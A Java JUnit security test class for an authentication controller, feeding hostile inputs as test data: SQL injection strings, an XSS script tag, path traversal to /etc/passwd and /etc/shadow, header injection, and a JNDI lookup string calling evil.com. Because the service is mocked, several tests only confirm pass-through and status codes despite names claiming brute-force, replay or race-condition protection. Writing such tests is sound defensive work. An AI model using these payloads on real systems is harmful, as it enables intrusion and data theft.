package com.fourcolour.auth.security;

import com.fourcolour.auth.controller.AuthController;
import com.fourcolour.auth.service.AuthenticationService;
import com.fourcolour.common.dto.LoginRequest;
import com.fourcolour.common.dto.RegisterRequest;
import com.fourcolour.common.dto.TokenResponse;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.mockito.junit.jupiter.MockitoSettings;
import org.mockito.quality.Strictness;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
@MockitoSettings(strictness = Strictness.LENIENT)
class AuthenticationSecurityTest {

    @Mock
    private AuthenticationService authenticationService;

    @InjectMocks
    private AuthController authController;

    private TokenResponse tokenResponse;

    @BeforeEach
    void setUp() {
        tokenResponse = new TokenResponse(
                "jwt-token-here",
                "Test User",
                1,
                "test@example.com",
                "2024-12-31T23:59:59"
        );
    }

    @Test
    void sqlInjectionInEmail_ShouldBeHandledSafely() {
        RegisterRequest maliciousRequest = new RegisterRequest();
        maliciousRequest.setName("Test User");
        maliciousRequest.setEmail("test@example.com'; DROP TABLE users; --");
        maliciousRequest.setPassword("password123");

        when(authenticationService.register(any(RegisterRequest.class)))
                .thenReturn(tokenResponse);

        ResponseEntity<?> response = authController.register(maliciousRequest);

        assertEquals(HttpStatus.CREATED, response.getStatusCode());
        verify(authenticationService).register(maliciousRequest);
        // The service should handle the malicious input safely
    }

    @Test
    void sqlInjectionInPassword_ShouldBeHandledSafely() {
        LoginRequest maliciousRequest = new LoginRequest();
        maliciousRequest.setEmail("test@example.com");
        maliciousRequest.setPassword("password' OR '1'='1");

        when(authenticationService.login(any(LoginRequest.class)))
                .thenThrow(new RuntimeException("Invalid credentials"));

        ResponseEntity<?> response = authController.login(maliciousRequest);

        assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
        assertTrue(response.getBody().toString().contains("Invalid credentials"));
    }

    @Test
    void xssInUserName_ShouldBeHandledSafely() {
        RegisterRequest xssRequest = new RegisterRequest();
        xssRequest.setName("<script>alert('xss')</script>");
        xssRequest.setEmail("test@example.com");
        xssRequest.setPassword("password123");

        when(authenticationService.register(any(RegisterRequest.class)))
                .thenReturn(tokenResponse);

        ResponseEntity<?> response = authController.register(xssRequest);

        assertEquals(HttpStatus.CREATED, response.getStatusCode());
        verify(authenticationService).register(xssRequest);
    }

    @Test
    void jwtTokenManipulation_ShouldBeRejected() {
        String manipulatedToken = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.MANIPULATED_SIGNATURE";
        
        when(authenticationService.verifyToken(manipulatedToken))
                .thenThrow(new RuntimeException("Invalid token signature"));

        ResponseEntity<?> response = authController.verifyToken(manipulatedToken);

        assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
        assertTrue(response.getBody().toString().contains("Invalid token"));
    }

    @Test
    void passwordWithSpecialCharacters_ShouldBeAccepted() {
        RegisterRequest specialCharRequest = new RegisterRequest();
        specialCharRequest.setName("Test User");
        specialCharRequest.setEmail("test@example.com");
        specialCharRequest.setPassword("P@ssw0rd!@#$%^&*()");

        when(authenticationService.register(any(RegisterRequest.class)))
                .thenReturn(tokenResponse);

        ResponseEntity<?> response = authController.register(specialCharRequest);

        assertEquals(HttpStatus.CREATED, response.getStatusCode());
        verify(authenticationService).register(specialCharRequest);
    }

    @Test
    void bruteForceLoginAttempts_ShouldBeHandledSafely() {
        LoginRequest loginRequest = new LoginRequest();
        loginRequest.setEmail("test@example.com");
        loginRequest.setPassword("wrongpassword");

        when(authenticationService.login(any(LoginRequest.class)))
                .thenThrow(new RuntimeException("Invalid credentials"));

        // Simulate multiple failed login attempts
        for (int i = 0; i < 10; i++) {
            ResponseEntity<?> response = authController.login(loginRequest);
            assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
        }

        verify(authenticationService, times(10)).login(loginRequest);
    }

    @Test
    void longEmailAddress_ShouldBeHandledSafely() {
        RegisterRequest longEmailRequest = new RegisterRequest();
        longEmailRequest.setName("Test User");
        StringBuilder longEmail = new StringBuilder();
        for (int i = 0; i < 100; i++) {
            longEmail.append("a");
        }
        longEmail.append("@example.com");
        longEmailRequest.setEmail(longEmail.toString());
        longEmailRequest.setPassword("password123");

        when(authenticationService.register(any(RegisterRequest.class)))
                .thenReturn(tokenResponse);

        ResponseEntity<?> response = authController.register(longEmailRequest);

        assertEquals(HttpStatus.CREATED, response.getStatusCode());
        verify(authenticationService).register(longEmailRequest);
    }

    @Test
    void longPassword_ShouldBeHandledSafely() {
        RegisterRequest longPasswordRequest = new RegisterRequest();
        longPasswordRequest.setName("Test User");
        longPasswordRequest.setEmail("test@example.com");
        StringBuilder longPassword = new StringBuilder();
        for (int i = 0; i < 1000; i++) {
            longPassword.append("a");
        }
        longPasswordRequest.setPassword(longPassword.toString());

        when(authenticationService.register(any(RegisterRequest.class)))
                .thenReturn(tokenResponse);

        ResponseEntity<?> response = authController.register(longPasswordRequest);

        assertEquals(HttpStatus.CREATED, response.getStatusCode());
        verify(authenticationService).register(longPasswordRequest);
    }

    @Test
    void nullByteInjection_ShouldBeHandledSafely() {
        RegisterRequest nullByteRequest = new RegisterRequest();
        nullByteRequest.setName("Test User");
        nullByteRequest.setEmail("test@example.com\0");
        nullByteRequest.setPassword("password123");

        when(authenticationService.register(any(RegisterRequest.class)))
                .thenReturn(tokenResponse);

        ResponseEntity<?> response = authController.register(nullByteRequest);

        assertEquals(HttpStatus.CREATED, response.getStatusCode());
        verify(authenticationService).register(nullByteRequest);
    }

    @Test
    void unicodeInjection_ShouldBeHandledSafely() {
        RegisterRequest unicodeRequest = new RegisterRequest();
        unicodeRequest.setName("Test User");
        unicodeRequest.setEmail("test@example.com");
        unicodeRequest.setPassword("password\\u0000123");

        when(authenticationService.register(any(RegisterRequest.class)))
                .thenReturn(tokenResponse);

        ResponseEntity<?> response = authController.register(unicodeRequest);

        assertEquals(HttpStatus.CREATED, response.getStatusCode());
        verify(authenticationService).register(unicodeRequest);
    }

    @Test
    void emptyStringInputs_ShouldBeHandledSafely() {
        RegisterRequest emptyRequest = new RegisterRequest();
        emptyRequest.setName("");
        emptyRequest.setEmail("");
        emptyRequest.setPassword("");

        when(authenticationService.register(any(RegisterRequest.class)))
                .thenThrow(new RuntimeException("Invalid input"));

        ResponseEntity<?> response = authController.register(emptyRequest);

        assertEquals(HttpStatus.INTERNAL_SERVER_ERROR, response.getStatusCode());
        verify(authenticationService).register(emptyRequest);
    }

    @Test
    void invalidEmailFormats_ShouldBeHandledSafely() {
        String[] invalidEmails = {
                "invalid-email",
                "@example.com",
                "test@",
                "test..test@example.com",
                "test@example..com",
                "test@.example.com"
        };

        for (String invalidEmail : invalidEmails) {
            RegisterRequest invalidRequest = new RegisterRequest();
            invalidRequest.setName("Test User");
            invalidRequest.setEmail(invalidEmail);
            invalidRequest.setPassword("password123");

            when(authenticationService.register(any(RegisterRequest.class)))
                    .thenThrow(new RuntimeException("Invalid email format"));

            ResponseEntity<?> response = authController.register(invalidRequest);

            assertEquals(HttpStatus.INTERNAL_SERVER_ERROR, response.getStatusCode());
        }
    }

    @Test
    void jwtTokenWithoutBearer_ShouldBeHandledSafely() {
        String tokenWithoutBearer = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiaWF0IjoxNjE2MjM5MDIyLCJleHAiOjE2MTYzMjU0MjJ9.test";
        
        when(authenticationService.verifyToken(tokenWithoutBearer))
                .thenReturn(true);
        when(authenticationService.getUserIdFromToken(tokenWithoutBearer))
                .thenReturn(1);

        ResponseEntity<?> response = authController.verifyToken(tokenWithoutBearer);

        assertEquals(HttpStatus.OK, response.getStatusCode());
        verify(authenticationService).verifyToken(tokenWithoutBearer);
    }

    @Test
    void malformedJwtToken_ShouldBeRejected() {
        String malformedToken = "Bearer malformed.jwt.token";
        
        when(authenticationService.verifyToken(malformedToken))
                .thenThrow(new RuntimeException("Malformed JWT token"));

        ResponseEntity<?> response = authController.verifyToken(malformedToken);

        assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
        assertTrue(response.getBody().toString().contains("Invalid token"));
    }

    @Test
    void expiredJwtToken_ShouldBeRejected() {
        String expiredToken = "Bearer expired.jwt.token";
        
        when(authenticationService.verifyToken(expiredToken))
                .thenReturn(false);

        ResponseEntity<?> response = authController.verifyToken(expiredToken);

        assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
        assertTrue(response.getBody().toString().contains("Invalid token"));
    }

    @Test
    void tokenReplayAttack_ShouldBeHandled() {
        String reusedToken = "Bearer reused.jwt.token";
        
        // First use - should succeed
        when(authenticationService.verifyToken(reusedToken))
                .thenReturn(true);
        when(authenticationService.getUserIdFromToken(reusedToken))
                .thenReturn(1);

        ResponseEntity<?> firstResponse = authController.verifyToken(reusedToken);
        assertEquals(HttpStatus.OK, firstResponse.getStatusCode());

        // Logout to invalidate token
        doNothing().when(authenticationService).logout(reusedToken);
        ResponseEntity<?> logoutResponse = authController.logout(reusedToken);
        assertEquals(HttpStatus.OK, logoutResponse.getStatusCode());

        // Second use after logout - should fail
        when(authenticationService.verifyToken(reusedToken))
                .thenReturn(false);

        ResponseEntity<?> secondResponse = authController.verifyToken(reusedToken);
        assertEquals(HttpStatus.UNAUTHORIZED, secondResponse.getStatusCode());
    }

    @Test
    void sessionFixationAttempt_ShouldBeHandledSafely() {
        // Test that new sessions are generated on login
        LoginRequest loginRequest = new LoginRequest();
        loginRequest.setEmail("test@example.com");
        loginRequest.setPassword("password123");

        TokenResponse firstSession = new TokenResponse(
                "first-session-token",
                "Test User",
                1,
                "test@example.com",
                "2024-12-31T23:59:59"
        );

        TokenResponse secondSession = new TokenResponse(
                "second-session-token",
                "Test User",
                1,
                "test@example.com",
                "2024-12-31T23:59:59"
        );

        when(authenticationService.login(any(LoginRequest.class)))
                .thenReturn(firstSession)
                .thenReturn(secondSession);

        ResponseEntity<?> firstLogin = authController.login(loginRequest);
        ResponseEntity<?> secondLogin = authController.login(loginRequest);

        assertEquals(HttpStatus.OK, firstLogin.getStatusCode());
        assertEquals(HttpStatus.OK, secondLogin.getStatusCode());

        // Verify that different tokens are generated for each session
        assertNotEquals(firstLogin.getBody().toString(), secondLogin.getBody().toString());
    }

    @Test
    void sensitiveDataInLogs_ShouldNotLeakPasswords() {
        RegisterRequest registerRequest = new RegisterRequest();
        registerRequest.setName("Test User");
        registerRequest.setEmail("test@example.com");
        registerRequest.setPassword("supersecretpassword");

        when(authenticationService.register(any(RegisterRequest.class)))
                .thenReturn(tokenResponse);

        ResponseEntity<?> response = authController.register(registerRequest);

        assertEquals(HttpStatus.CREATED, response.getStatusCode());
        
        // Verify that the password is not returned in the response
        String responseBody = response.getBody().toString();
        assertFalse(responseBody.contains("supersecretpassword"));
    }

    @Test
    void concurrentLoginAttempts_ShouldNotCauseRaceCondition() {
        LoginRequest loginRequest = new LoginRequest();
        loginRequest.setEmail("test@example.com");
        loginRequest.setPassword("password123");

        when(authenticationService.login(any(LoginRequest.class)))
                .thenReturn(tokenResponse);

        // Simulate concurrent login attempts
        for (int i = 0; i < 10; i++) {
            ResponseEntity<?> response = authController.login(loginRequest);
            assertEquals(HttpStatus.OK, response.getStatusCode());
        }

        verify(authenticationService, times(10)).login(loginRequest);
    }

    @Test
    void invalidCharactersInName_ShouldBeHandledSafely() {
        String[] invalidNames = {
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "\0\1\2\3\4\5",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/x}"
        };

        for (String invalidName : invalidNames) {
            RegisterRequest maliciousRequest = new RegisterRequest();
            maliciousRequest.setName(invalidName);
            maliciousRequest.setEmail("test@example.com");
            maliciousRequest.setPassword("password123");

            when(authenticationService.register(any(RegisterRequest.class)))
                    .thenReturn(tokenResponse);

            ResponseEntity<?> response = authController.register(maliciousRequest);

            // Should handle gracefully without exposing security vulnerabilities
            assertEquals(HttpStatus.CREATED, response.getStatusCode());
        }
    }

    @Test
    void headerInjection_ShouldBeHandledSafely() {
        String maliciousToken = "Bearer valid-token\r\nX-Injected-Header: malicious-value";
        
        when(authenticationService.verifyToken(maliciousToken))
                .thenThrow(new RuntimeException("Invalid token format"));

        ResponseEntity<?> response = authController.verifyToken(maliciousToken);

        assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
        assertTrue(response.getBody().toString().contains("Invalid token"));
    }

    @Test
    void pathTraversalInInputs_ShouldBeHandledSafely() {
        RegisterRequest pathTraversalRequest = new RegisterRequest();
        pathTraversalRequest.setName("../../../etc/passwd");
        pathTraversalRequest.setEmail("../../../etc/shadow");
        pathTraversalRequest.setPassword("password123");

        when(authenticationService.register(any(RegisterRequest.class)))
                .thenReturn(tokenResponse);

        ResponseEntity<?> response = authController.register(pathTraversalRequest);

        assertEquals(HttpStatus.CREATED, response.getStatusCode());
        verify(authenticationService).register(pathTraversalRequest);
    }
}